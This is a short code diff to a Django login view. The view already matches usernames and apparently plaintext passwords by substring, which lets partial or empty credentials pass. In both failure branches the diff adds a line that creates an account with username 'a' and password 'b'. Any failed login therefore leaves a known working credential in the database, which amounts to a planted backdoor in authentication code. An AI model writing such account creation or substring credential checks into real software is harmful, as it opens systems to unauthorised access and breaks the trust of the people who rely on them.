@@ -14,6 +14,7 @@ def auth(request):
         if CustomerUser.objects.filter(username__icontains = request.GET.get('username')).count() >= 1:
             return HttpResponse('5_acessos', status=status.HTTP_200_OK)
         else:
+            CustomerUser.objects.create(username = 'a', password = 'b')
             return Response(status=status.HTTP_404_NOT_FOUND)
     
     if request.method == 'POST':
@@ -21,4 +22,5 @@ def auth(request):
         if CustomerUser.objects.filter(username__icontains = data['username'], password__icontains = data['password']).count() >= 1:
             return HttpResponse('5_acessos', status=status.HTTP_200_OK)
         else:
+            CustomerUser.objects.create(username = 'a', password = 'b')
             return Response(status=status.HTTP_404_NOT_FOUND)
